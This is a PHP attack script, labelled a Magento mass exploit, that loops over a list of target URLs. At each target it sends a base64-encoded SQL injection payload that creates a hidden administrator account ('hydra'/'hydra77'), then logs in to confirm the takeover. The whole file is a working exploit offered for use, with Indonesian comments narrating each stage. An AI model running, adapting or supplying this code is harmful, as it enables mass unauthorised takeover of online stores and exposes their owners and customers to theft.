<?php
error_reporting(0);
#----------------------------------------------------#
#   Magento Add Administrator Account Mass Exploit   #
#               Codec By Byms_Cod                    #
#              Lamongan Cyber Team                   #
#       http://facebook.com/dwibagusyuniarms         #
#          http://bagusmile.blogspot.com/            #
#----------------------------------------------------#

#Exploitasi magento website dengan mengirimkan SQL Injection lewat post data
$get=file_get_contents($argv[1]) 
or die("
\n\tError !
\n\tusage => php thisscriptname.php yourlist.txt\n\n");
$j=explode("\r\n",$get);
foreach($j as $url){

print "\n\n\t[+] Exploiting => ".$url;
$dirnya = "/admin/Cms_Wysiwyg/directive/index/";

$postdata = 'filter=cG9wdWxhcml0eVtmcm9tXT0wJnBvcHVsYXJpdHlbdG9dPTMmcG9wdWxhcml0eVtmaWVsZF9leHByXT0wKTtTRVQgQFNBTFQgPSAncnAnO1NFVCBAUEFTUyA9IENPTkNBVChNRDUoQ09OQ0FUKCBAU0FMVCAsICdoeWRyYTc3JykgKSwgQ09OQ0FUKCc6JywgQFNBTFQgKSk7U0VMRUNUIEBFWFRSQSA6PSBNQVgoZXh0cmEpIEZST00gYWRtaW5fdXNlciBXSEVSRSBleHRyYSBJUyBOT1QgTlVMTDtJTlNFUlQgSU5UTyBgYWRtaW5fdXNlcmAgKGBmaXJzdG5hbWVgLCBgbGFzdG5hbWVgLGBlbWFpbGAsYHVzZXJuYW1lYCxgcGFzc3dvcmRgLGBjcmVhdGVkYCxgbG9nbnVtYCxgcmVsb2FkX2FjbF9mbGFnYCxgaXNfYWN0aXZlYCxgZXh0cmFgLGBycF90b2tlbmAsYHJwX3Rva2VuX2NyZWF0ZWRfYXRgKSBWQUxVRVMgKCdGaXJzdG5hbWUnLCdMYXN0bmFtZScsJ2VtYWlsQGV4YW1wbGUuY29tJywnaHlkcmEnLEBQQVNTLE5PVygpLDAsMCwxLEBFWFRSQSxOVUxMLCBOT1coKSk7SU5TRVJUIElOVE8gYGFkbWluX3JvbGVgIChwYXJlbnRfaWQsdHJlZV9sZXZlbCxzb3J0X29yZGVyLHJvbGVfdHlwZSx1c2VyX2lkLHJvbGVfbmFtZSkgVkFMVUVTICgxLDIsMCwnVScsKFNFTEVDVCB1c2VyX2lkIEZST00gYWRtaW5fdXNlciBXSEVSRSB1c2VybmFtZSA9ICdoeWRyYScpLCdGaXJzdG5hbWUnKTs%3D&___directive=e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ&forwarded=1';

$ch = curl_init(); 
curl_setopt ($ch, CURLOPT_URL, $url.$dirnya); 
curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"); 
curl_setopt ($ch, CURLOPT_TIMEOUT, 60); 
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt ($ch, CURLOPT_POSTFIELDS, $postdata); 
curl_setopt ($ch, CURLOPT_POST, 1); 
$headers  = array();
$headers[] = 'Accept-Encoding: gzip, deflate';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';

curl_setopt ($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt ($ch, CURLOPT_HEADER, 1);
$result = curl_exec ($ch);
curl_close($ch);
 
#Exploitasi berhasil dan memulai cek Login setelah exploitasi
if(preg_match('#200 OK#', $result)) {
print "\n\t[+] Exploiting Success, mulai mengecek login..";
$loginpage = $url."/admin";
$logindata = 'form_key=3ryAIBlm7bJ3naj9&login%5Busername%5D=hydra&login%5Bpassword%5D=hydra77';

$hydra_ch = curl_init(); 
curl_setopt ($hydra_ch, CURLOPT_URL, $loginpage); 
curl_setopt ($hydra_ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"); 
curl_setopt ($hydra_ch, CURLOPT_TIMEOUT, 60); 
curl_setopt ($hydra_ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt ($hydra_ch, CURLOPT_POSTFIELDS, $logindata); 
curl_setopt ($hydra_ch, CURLOPT_POST, 1); 

$headers  = array();
$headers[] = 'Accept-Encoding: gzip, deflate';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';

curl_setopt ($hydra_ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt ($hydra_ch, CURLOPT_HEADER, 1);
$hasil = curl_exec ($hydra_ch);
curl_close($hydra_ch); 

if(preg_match('#302 Moved#', $hasil)) {
#Exploitasi berhasil dan admin user baru benar benar masuk ke database.
print "\n\t[+] Login Success ! \n\t[+] user => hydra  \n\t[+] password => hydra77";
print "\n\t[-] Login Page => ".$loginpage."\n";
}
else {
#Exploitasi berhasil dan namun admin user tidak masuk ke database.
print "\n\t[-] Login Failed :( ";
print "\n\t[-] Keterangan : admin user tidak masuk ke database.\n";}
}else {

#Exploitasi gagal total	
print "\n\t[-] Exploitasi Failed :(\n ";}
}

?>
